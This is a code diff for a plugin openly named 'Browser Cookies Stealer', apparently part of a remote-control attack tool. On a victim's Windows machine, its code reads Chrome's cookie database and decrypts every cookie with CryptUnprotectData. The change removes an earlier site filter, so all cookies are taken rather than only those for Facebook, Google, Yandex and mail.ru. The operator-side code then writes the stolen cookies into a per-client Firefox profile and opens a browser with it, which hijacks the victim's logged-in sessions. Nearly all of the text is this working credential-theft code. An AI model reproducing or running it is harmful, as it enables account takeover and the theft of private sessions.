@@ -3,14 +3,6 @@ plugin_description = r"""Browser Cookies Stealer"""
 r_source = r"""
 import sqlite3
 import win32crypt
-urls = {
-    '.facebook.com': (),
-    '.yandex.com': (),
-    '.yandex.ru': (),
-    '.mail.ru': (),
-    '.google.com': (),
-    'accounts.google.com': (),
-}
 # Chrome Stealer
 PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\Cookies'
 connection = sqlite3.connect(PathName)
@@ -20,62 +12,49 @@ with connection:
     v = cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
     values = v.fetchall()
     for info in values:
-        if info[0] in urls:
-            host = info[0]
-            name = info[1]
-            value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
-            sessions.append({
-                    'domain': host,
-                    'name': name,
-                    'value': value,
-                })
+        host = info[0]
+        name = info[1]
+        value = win32crypt.CryptUnprotectData(info[2], None, None, None, 0)[1]
+        sessions.append({
+                'domain': host,
+                'name': name,
+                'value': value,
+            })
 mprint = sessions
 """
 l_source = r"""
 # Chrome Cookies Stealer
 import ast
-from selenium import webdriver
-log('[*] modules imported [+]')
-sessions = ast.literal_eval(mprint)
-log('[*] mprint decrypted')
-
-def chrome_sessions(sessions):
+import threading
+cookies = ast.literal_eval(mprint)
+def chrome_sessions(cookies, client_id, assets):
     from selenium import webdriver
+    from selenium.webdriver.firefox.webdriver import FirefoxProfile
     from selenium.webdriver.common.keys import Keys
-    import os
+    import shutil
+    import sqlite3
     import sys
-    cookies = sessions
-    sites = []
-    urls = {
-        u'.facebook.com': u'https://www.facebook.com',
-        u'.mail.ru': u'https://e.mail.ru',
-        u'.yandex.com': u'https://mail.yandex.com',
-        u'.yandex.ru': u'https://mail.yandex.ru',
-        u'.google.com': u'https://mail.google.com',
-        u'accounts.google.com': u'https://mail.google.com',
-    }
-    driver_chrome = webdriver.Firefox()
-    loading_html = os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', 'loading.html').replace('\\', '/')
-    ready_html = os.path.join(os.path.dirname(sys.argv[0]), 'assets', 'cookieStealer', 'ready.html').replace('\\', '/')
-    l = []
-    for dics in cookies:
-        l.append(dics['domain'])
-    domains = set(l)
-    driver_chrome.get('file://'+loading_html)
-    for domain in domains:
-        driver_chrome.refresh()
-        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
-        driver_chrome.get(urls[domain])
+    path_to_profile = os.path.join(os.path.dirname(sys.argv[0]), 'firefoxProfiles', '{}'.format(client_id))
+    path_to_cookies = os.path.join(path_to_profile, 'cookies.sqlite')
+    default_cookies_path = os.path.join(assets, 'cookies.sqlite')
+    if not os.path.exists(path_to_profile):
+        os.makedirs(path_to_profile)
+    shutil.copy2(default_cookies_path, path_to_cookies)
+    with sqlite3.connect(path_to_cookies) as connection:
+        print 'aq'
+        cursor = connection.cursor()
+        l = 0
         for cookie in cookies:
-            if cookie['domain'] == domain:
-                driver_chrome.add_cookie(cookie)
-        sites.append(urls[domain])
-        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 'w')
-    filter_sites = set(sites)
-    for i in filter_sites:
-        driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + 't')
-        driver_chrome.get(i)
-    driver_chrome.find_element_by_tag_name('body').send_keys(Keys.CONTROL + '1')
-    driver_chrome.get('file://'+ready_html)
-chrome_sessions(sessions)
+            print l
+            l+=1
+            v = cursor.execute('INSERT INTO moz_cookies VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)',
+            (None,None,None,cookie['name'],cookie['value'],None,cookie['domain'],None,None,None,None,None,None,None))
+            connection.commit()
+        print 'aq2'
+    print '3'
+    profile = FirefoxProfile(path_to_profile)
+    driver_chrome = webdriver.Firefox(profile)
+    print '4'
+chrome_threading = threading.Thread(target=chrome_sessions, args=(cookies, client_id, assets))
+chrome_threading.start()
 """
